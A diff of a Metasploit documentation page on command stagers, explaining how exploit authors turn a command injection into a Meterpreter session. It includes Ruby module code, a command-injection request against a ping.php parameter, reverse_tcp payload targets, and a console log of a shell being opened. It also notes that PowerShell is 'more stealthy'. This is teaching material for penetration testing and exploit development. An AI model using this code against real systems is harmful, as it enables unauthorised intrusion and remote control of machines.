@@ -1,4 +1,6 @@
-Command stagers provide an easy way to write exploits against typical vulnerabilities such as [command execution](https://www.owasp.org/index.php/Command_Injection) or [code injection](https://www.owasp.org/index.php/Code_Injection). There are currently 14 different flavors of command stagers, each uses system command (or commands) to save your payload, sometimes decode, and execute.
+If you’ve found a way to execute a command on a target, and you’d like the leverage that ability to execute a command into a meterpreter session, command stagers are for you.  Command stagers provide an easy way to write exploits that leverage vulnerabilities such as [command execution](https://www.owasp.org/index.php/Command_Injection) or [code injection](https://www.owasp.org/index.php/Code_Injection) and turn them into sessions. There are currently 14 different flavors of command stagers, each uses system command (or commands) to save (or not save) your payload, sometimes decode, and execute.
+
+The hardest part about command stagers is understanding how much they do.  All you need to do for a command stager is to define how the command injection works in the `execute_command` method and then select a few options.
 
 # The Vulnerability Test Case
 
@@ -85,7 +87,7 @@ An example of setting flavors for a specific target:
   ]
 ```
 
-Or, you can pass this info to the `execute_cmdstager` method (see Call #execute_cmdstager to begin).
+Or, you can pass this info to the `execute_cmdstager` method (see Step 4 to begin).
 
 ```ruby
 execute_cmdstager(flavor: :vbs)
@@ -96,11 +98,62 @@ However, it is best to set the compatible list of flavors in `CmdStagerFlavor`, 
 
 **3. Create the execute_command method**
 
-You also must create a ```def execute_command(cmd, opts = {})``` method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the ```cmd``` variable to the vulnerable code.
+You also must create a ```def execute_command(cmd, opts = {})``` method in your module. This is how you define how to execute a command on the target.  The parameter `cmd` is the command to execute.  When writing the ```execute_cmd``` method, remember that
 
-**4. Call #execute_cmdstager to begin**
+**4. Decide on the supported payloads**
 
-And lastly, in your exploit method, call ```execute_cmdstager``` to begin the command stager.
+CmdStagers are intended to support payloads that are uploaded, saved to disk, and launched, but many of the payloads in Metasploit Framework do not need to be saved to disk; these payloads are `ARCH_CMD` payloads that rely on software already present on the target system like netcat, bash, python, or ssh.  Depending on whether the payload needs to be saved to disk or not changes what payloads are supported and how we launch the payload, so we must provide the user the ability to pick between the two.
+The best way to let the user decide what kind of payload to use is by defining separate [[targets|Get-Started-Writing-an-Exploit.md]]
+
+Here is an example targets section from a command injection module:
+
+```
+    'Targets' => [
+      [
+        'Unix Command',
+        {
+          'Platform' => 'unix',
+          'Arch' => ARCH_CMD,
+          'Type' => :unix_cmd,
+          'DefaultOptions' => {
+            'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp',
+            'RPORT' => 9000
+          }
+        }
+      ],
+      [
+        'Linux (Dropper)',
+        {
+          'Platform' => 'linux',
+          'Arch' => [ARCH_X64],
+          'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
+          'Type' => :linux_dropper
+        }
+      ],
+
+```
+
+The first target is the `ARCH_CMD` target and `unix` platform.  This allows the user to select any payload that starts with `cmd/unix`.  These payloads do not need to be saved to disk and can just be launched at the command line.  The second is `ARCH_X64` and the platform is `linux`; this lets us choose any payload that starts with `linux/x64`.  These targets must be saved to disk before they can be launched, and as such, you will often see this second type of payload referred to as a ‘dropper’ because the file must be ‘dropped’ to the disk before it can be executed.  In each of the targets above, we’ve selected a default payload we know will work.
+
+**4. Executing a payload**
+As we said earlier, the way a payload is executed depends on the payload type.  By including `Msf::Exploit::CmdStager` you are given access to a method called ```execute_cmdstager```.  ```execute_cmdstager``` makes a list of required commands to upload, save, and execute your payload, then uses the ```execute_command``` method you defined earlier to run them on the target.
+Unfortunately, we just mentioned not all payloads need to be saved to disk.  In the case of a payload that does not need to be saved to disk, we only need to call ```execute_command```.
+This problem of payload/method juggling sounds far worse than it is.  Below is a quick example of how simple the ```exploit``` method will become if you have properly defined your targets as discussed in step 3:
+
+```ruby
+  def exploit
+    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
+    case target['Type']
+    when :unix_cmd
+      execute_command(payload.encoded)
+    when :linux_dropper
+      execute_cmdstager
+    end
+  end
+```
+
+That’s it.  If the user selects an `ARCH_CMD` payload, we call the ```execute_command``` method on the _already_ _encoded_ payload.  You don’t need to worry about encoding the payload in your ```execute_command``` method.
+If the user has selected a binary payload like `ARCH_X64` or `ARCH_X86`, then we call ```execute_cmdstager``` which figures out how to save the file to disk and launch it based on the flavor you set earlier.
 
 Over the years, we have also learned that these options are quite handy when calling
 `execute_cmdstager`:
@@ -119,22 +172,26 @@ class MetasploitModule < Msf::Exploit::Remote
 
   include Msf::Exploit::CmdStager
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'            => "Command Injection Using CmdStager",
-      'Description'     => %q{
-        This exploits a command injection using the command stager.
-      },
-      'License'         => MSF_LICENSE,
-      'Author'          => [ 'sinn3r' ],
-      'References'      => [ [ 'URL', 'http://metasploit.com' ] ],
-      'Platform'        => 'linux',
-      'Targets'         => [ [ 'Linux', {} ] ],
-      'Payload'         => { 'BadChars' => "\x00" },
-      'CmdStagerFlavor' => [ 'printf' ],
-      'Privileged'      => false,
-      'DisclosureDate'  => "2016-06-10",
-      'DefaultTarget'   => 0))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Command Injection Using CmdStager',
+        'Description' => %q{
+          This exploits a command injection using the command stager.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'sinn3r' ],
+        'References' => [ [ 'URL', 'http://metasploit.com' ] ],
+        'Platform' => 'linux',
+        'Targets' => [ [ 'Linux', {} ] ],
+        'Payload' => { 'BadChars' => "\x00" },
+        'CmdStagerFlavor' => [ 'printf' ],
+        'Privileged' => false,
+        'DisclosureDate' => '2016-06-10',
+        'DefaultTarget' => 0
+      )
+    )
   end
 
   def execute_command(cmd, opts = {})
@@ -142,7 +199,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def exploit
-    print_status("Exploiting...")
+    print_status('Exploiting...')
     execute_cmdstager
   end
 
@@ -158,7 +215,7 @@ Now let's modify the `execute_command` method and get code execution against the
 127.0.0.1+%26%26+[Malicious commands]
 ```
 
-We do that in `execute_command` using [HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient). Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:
+We do that in `execute_command` using [[HttpClient|./How-to-Send-an-HTTP-Request-Using-HttpClient.md]]. Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:
 
 ```ruby
 def filter_bad_chars(cmd)
@@ -167,19 +224,21 @@ def filter_bad_chars(cmd)
   cmd.gsub!(/ /, '+')
 end
 
-def execute_command(cmd, opts = {})
-  send_request_cgi({
-    'method'        => 'GET',
-    'uri'           => '/ping.php',
-    'encode_params' => false,
-    'vars_get'      => {
-      'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)}"
+def execute_command(cmd, _opts = {})
+  send_request_cgi(
+    {
+      'method' => 'GET',
+      'uri' => '/ping.php',
+      'encode_params' => false,
+      'vars_get' => {
+        'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)}"
+      }
     }
-  })
+  )
 end
 
 def exploit
-  print_status("Exploiting...")
+  print_status('Exploiting...')
   execute_cmdstager
 end
 ```
@@ -187,10 +246,10 @@ end
 And let's run that, we should have a shell:
 
 
-```
+```msf
 msf exploit(cmdstager_demo) > run
 
-[*] Started reverse TCP handler on 10.6.0.92:4444 
+[*] Started reverse TCP handler on 10.6.0.92:4444
 [*] Exploiting...
 [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
 [*] Sending stage (1495599 bytes) to 10.6.0.92
@@ -223,7 +282,7 @@ Available flavors:
 
 The [VBS command stager](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/vbs.rb) is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a [VBS script](https://github.com/rapid7/rex-exploitation/blob/master/data/exploits/cmdstager/vbs_b64) using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it.
 
-If you are exploiting Windows that supports Powershell, then you might want to [consider using that instead](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit) of the VBS stager, because Powershell tends to be more stealthy.
+If you are exploiting Windows that supports Powershell, then you might want to [[consider using that instead|./How-to-use-Powershell-in-an-exploit.md]] of the VBS stager, because Powershell tends to be more stealthy.
 
 To use the VBS stager, either specify your CmdStagerFlavor in the metadata:
 
